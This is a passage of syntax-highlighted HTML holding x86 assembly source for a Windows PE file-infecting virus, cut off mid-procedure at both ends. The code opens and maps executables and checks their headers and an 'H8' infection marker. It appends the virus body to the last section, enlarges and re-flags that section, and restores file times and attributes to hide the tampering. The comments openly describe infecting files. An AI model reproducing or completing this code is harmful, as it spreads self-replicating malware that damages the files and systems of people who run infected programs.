       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_map</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">          </span><span class="sc1">; save map address</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">           </span><span class="sc1">; is it a MZ EXE file?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">unmap_view</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_lfanew</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get PE header offset</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                     </span><span class="sc1">; too far?</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">unmap_view</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; save map address</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">           </span><span class="sc1">; is it a PE file?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">unmap_view</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PEheader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">  </span><span class="sc1">; save PE header place</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_HEADER_SIZE</span><span class="sc0">    </span><span class="sc1">; go to Optional header</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_Win32VersionValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'H8'</span><span class="sc0"> </span><span class="sc1">; already infected?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">unmap_view</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFile</span><span class="sc0">                    </span><span class="sc1">; infect, please!</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">don_t_mark</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">files</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; decrease infected files</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_Win32VersionValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'H8'</span><span class="sc0"> </span><span class="sc1">; mark infection</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">don_t_mark</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">unmap_view</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; unmap the view</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">close_map</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">maphandle</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">; close the map</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CloseHandle</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">; first we must set the file</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">; pointer at the end of file</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handle1</span><span class="sc4">]</span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetFilePointer</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handle1</span><span class="sc4">]</span><span class="sc1">; ...and then mark the end of</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetEndOfFile</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; file...</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileTime</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; restore the file time</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handle1</span><span class="sc4">]</span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetFileTime</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle1</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; close the file...</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CloseHandle</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fileattributes</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; restore the file attribs</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fileofs</span><span class="sc4">]</span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetFileAttributes</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">next_file_exit</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                              </span><span class="sc1">; restore registers and exit</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">OpenFile</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Infect opened file                                                     Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Entry:  ESI = pointer to the file map</span><span class="sc0">

</span><span class="sc5">InfectFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
     </span><span class="sc6">pushad</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; save all the needed</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filealign</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; values</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_SectionAlignment</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sectionalign</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oldeip</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_ImageBase</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newimagebase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_NumberOfRvaAndSizes</span><span class="sc4">]</span><span class="sc1">; let us locate the</span><span class="sc0">
     </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                     </span><span class="sc1">; last section</span><span class="sc0">
     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NumberOfSections</span><span class="sc4">-</span><span class="sc5">IMAGE_FILE_HEADER_SIZE</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SECTION_HEADER_SIZE</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PEheader</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; PE header offset +</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_HEADER_SIZE</span><span class="sc0">                </span><span class="sc1">; header length +</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">                                   </span><span class="sc1">; optional header len +</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                   </span><span class="sc1">; + data directory</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                   </span><span class="sc1">; + all sections</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsection</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; save last section addr</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; get pointer to raw data</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; and align it to memory</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; and then add virtual</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">smth</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                            </span><span class="sc1">; size and save the value</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">pushad</span><span class="sc0">                                         </span><span class="sc1">; let us copy our virus</span><span class="sc0">
     </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; there...</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">popad</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">  </span><span class="sc1">; increase the sizes</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc1">; (virtual and physical)</span><span class="sc0">
     </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0C0000040h</span><span class="sc1">; make section R/W</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; align SizeOfRawData</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filealign</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; to the file</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                       </span><span class="sc1">; alignment</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; and store it</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PEheader</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Get OldSizeOfImage</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">                             </span><span class="sc1">; increase it and then</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sectionalign</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; align it to the section</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                       </span><span class="sc1">; alignment</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
